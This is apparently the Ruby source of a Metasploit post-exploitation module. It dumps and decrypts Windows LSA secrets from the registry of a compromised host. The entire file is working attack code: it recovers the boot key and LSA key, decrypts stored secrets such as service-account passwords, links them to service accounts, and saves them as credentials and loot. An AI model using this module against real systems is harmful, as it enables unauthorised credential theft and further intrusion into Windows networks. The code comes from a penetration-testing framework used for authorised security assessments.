##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Priv
  include Msf::Post::Common
  include Msf::Post::Windows::Registry

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Enumerate LSA Secrets',
        'Description' => %q{
          This module will attempt to enumerate the LSA Secrets keys within the registry. The registry value used is:
          HKEY_LOCAL_MACHINE\Security\Policy\Secrets\. Thanks goes to Maurizio Agazzini and Mubix for decrypt
          code from cachedump.
        },
        'License' => MSF_LICENSE,
        'Platform' => ['win'],
        'SessionTypes' => ['meterpreter'],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => []
        },
        'Author' => ['Rob Bathurst <rob.bathurst[at]foundstone.com>']
      )
    )
    register_options([
      OptBool.new('STORE', [true, 'Store decrypted credentials in database', true]),
    ])
  end

  # Decrypted LSA key is passed into this method
  def get_secret(lsa_key)
    output = "\n"

    # LSA Secret key location within the registry
    root_regkey = 'HKLM\\Security\\Policy\\Secrets'
    services_key = 'HKLM\\SYSTEM\\CurrentControlSet\\Services'

    secrets = registry_enumkeys(root_regkey)

    secrets.each do |secret_regkey|
      sk_arr = registry_enumkeys(root_regkey + '\\' + secret_regkey)
      next unless sk_arr

      sk_arr.each do |mkeys|
        # CurrVal stores the currently set value of the key. In the case
        # of services, this is usually the password for the service
        # account.
        next unless mkeys == 'CurrVal'

        val_key = root_regkey + '\\' + secret_regkey + '\\' + mkeys
        encrypted_secret = registry_getvaldata(val_key, '')

        next unless encrypted_secret

        if lsa_vista_style?
          # Magic happens here
          decrypted = decrypt_lsa_data(encrypted_secret, lsa_key)
        else
          # and here
          if sysinfo['Architecture'] == ARCH_X64
            encrypted_secret = encrypted_secret[0x10..]
          else # 32 bits
            encrypted_secret = encrypted_secret[0xC..]
          end

          decrypted = decrypt_secret_data(encrypted_secret, lsa_key)
        end

        next if decrypted.empty?

        # axe all the non-printables
        decrypted = decrypted.scan(/[[:print:]]/).join

        if secret_regkey.start_with?('_SC_')
          # Service secrets are named like "_SC_yourmom" for a service
          # with name "yourmom". Strip off the "_SC_" to get something
          # we can lookup in the list of services to find out what
          # account this secret is associated with.
          svc_name = secret_regkey[4, secret_regkey.length]
          svc_user = registry_getvaldata(services_key + svc_name, 'ObjectName')

          # if the unencrypted value is not blank and is a service, print
          print_good("Key: #{secret_regkey}\n Username: #{svc_user} \n Decrypted Value: #{decrypted}\n")
          output << "Key: #{secret_regkey}\n Username: #{svc_user} \n Decrypted Value: #{decrypted}\n"
          if datastore['STORE']
            create_credential({
              workspace_id: myworkspace_id,
              origin_type: :session,
              session_id: session_db_id,
              post_reference_name: refname,
              private_type: :password,
              private_data: decrypted,
              username: svc_user,
              service_name: "LSA Secret: #{secret_regkey}",
              status: Metasploit::Model::Login::Status::UNTRIED
            })
          end
        else
          # if the unencrypted value is not blank, print
          print_good("Key: #{secret_regkey}\n Decrypted Value: #{decrypted}\n")
          output << "Key: #{secret_regkey}\n Decrypted Value: #{decrypted}\n"
          if datastore['STORE']
            create_credential({
              workspace_id: myworkspace_id,
              origin_type: :session,
              session_id: session_db_id,
              post_reference_name: refname,
              private_type: :password,
              private_data: decrypted,
              service_name: "LSA Secret: #{secret_regkey}",
              status: Metasploit::Model::Login::Status::UNTRIED
            })
          end
        end
      end
    end

    output
  end

  # The sauce starts here
  def run
    hostname = sysinfo.nil? ? cmd_exec('hostname') : sysinfo['Computer']
    print_status("Running module against #{hostname} (#{session.session_host})")

    print_status('Obtaining boot key...')
    bootkey = capture_boot_key

    fail_with(Failure::Unknown, 'Could not retrieve boot key. Are you SYSTEM?') if bootkey.blank?

    vprint_status("Boot key: #{bootkey.unpack1('H*')}")

    print_status('Obtaining LSA key...')
    lsa_key = capture_lsa_key(bootkey)

    fail_with(Failure::Unknown, 'Could not retrieve LSA key. Are you SYSTEM?') if lsa_key.blank?

    vprint_status("LSA Key: #{lsa_key.unpack1('H*')}")

    secrets = get_secret(lsa_key)

    print_status('Writing to loot...')

    path = store_loot(
      'registry.lsa.sec',
      'text/plain',
      session,
      "#{hostname}#{secrets}",
      'reg_lsa_secrets.txt',
      'Registry LSA Secret Decrypted File'
    )

    print_status("Data saved in: #{path}")
  end
end
